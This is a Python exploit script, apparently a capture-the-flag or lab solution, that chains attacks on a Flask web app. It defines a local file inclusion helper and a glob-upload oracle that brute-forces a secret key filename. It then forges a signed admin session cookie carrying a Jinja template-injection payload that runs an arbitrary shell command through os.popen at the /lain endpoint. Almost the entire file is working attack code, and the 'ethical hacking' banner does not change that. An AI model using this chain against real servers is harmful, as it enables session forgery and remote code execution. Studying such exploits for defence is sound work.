import requests
import hashlib
import time
from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer
import sys
import signal

REMOTE = None
LOCAL = None

session = requests.Session()

class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

def banner(text):
    width = len(text) + 4
    print(f"{C.MAGENTA}{C.BOLD}")
    print("╔" + "═" * width + "╗")
    print(f"║  {text}  ║")
    print("╚" + "═" * width + "╝")
    print(C.RESET)

def info(msg):
    print(f"{C.CYAN}[*]{C.RESET} {msg}")

def good(msg):
    print(f"{C.GREEN}[+]{C.RESET} {msg}")

def warn(msg):
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")

def bad(msg):
    print(f"{C.RED}[-]{C.RESET} {msg}")

def kv(label, value, color=C.WHITE):
    print(f"{C.DIM}    {label}:{C.RESET} {color}{value}{C.RESET}")

def spinner_char(i):
    return "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"[i % 10]

# -------------------------------------------------------------------------

def LFI(filename):
    r = requests.get(f"{REMOTE}/search?q={filename}")
    return r.text.split("<br>")[3]

def make_glob_request(prefix):
    data = {'filename': prefix, 'content': '123456'}
    r = requests.post(f"{REMOTE}/upload", data=data)
    return "file already exists..." in r.text

def brute_force_filename():
    prefix = "../key/secret_"
    warn(f"brute-forcing secret key filename via glob upload oracle...")
    charset = "-abcdef1234567890"
    i = 0
    while len(prefix) != 50:
        found = False
        for char in charset:
            i += 1
            print(f"\r{C.CYAN}{spinner_char(i)}{C.RESET} trying "
                  f"{C.DIM}{prefix}{C.RESET}{C.YELLOW}{char}{C.RESET}*"
                  + " " * 10, end="", flush=True)
            response = make_glob_request(f'{prefix}{char}*')
            if response:
                prefix += char
                print()
                good(f"found character -> {C.BOLD}{prefix}{C.RESET}")
                found = True
                break
        if not found:
            print()
            bad("no matching character found, stuck!")
            break
    print()
    good(f"full secret key filename recovered: {C.BOLD}{prefix}{C.RESET}")
    return prefix

def sign_flask_session(secret_key: str, session_data: dict) -> str:
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }

    s = URLSafeTimedSerializer(
        secret_key,
        salt=salt,
        serializer=serializer,
        signer_kwargs=signer_kwargs
    )

    return s.dumps(session_data)

def handler(signum, frame):
    raise TimeoutError("SSTI payload fired!")

def trigger_ssti(cookie):
    r = requests.get(f"{REMOTE}/lain", cookies={"session": cookie})
    return r.text

if __name__ == "__main__":

    try:
        REMOTE = sys.argv[1]
        SIGNING_KEY = sys.argv[2]
        COMMAND = sys.argv[3]

    except:
        print("Usage: python web_exploit.py [REMOTE] [SIGNING_KEY] [COMMAND]")
        sys.exit(1)

    banner("[ETHICAL HACKING] Web server exploit: LFI -> Globbing Oracle -> SSTI -> RCE")

    signing_key = SIGNING_KEY

    info("forging admin session cookie with SSTI payload embedded...")
    SSTI_PAYLOAD = f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('{COMMAND}').read() }}}}"
    data = {"is_admin": True, "uuid": SSTI_PAYLOAD}
    cookie_value = sign_flask_session(signing_key, data)
    kv("cookie_value", cookie_value, C.MAGENTA)
    print()

    info("firing request to /lain ...")
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(1)

    result = trigger_ssti(cookie_value)
    idx = result.index("welcome")
    print(result[idx-20:idx+200])
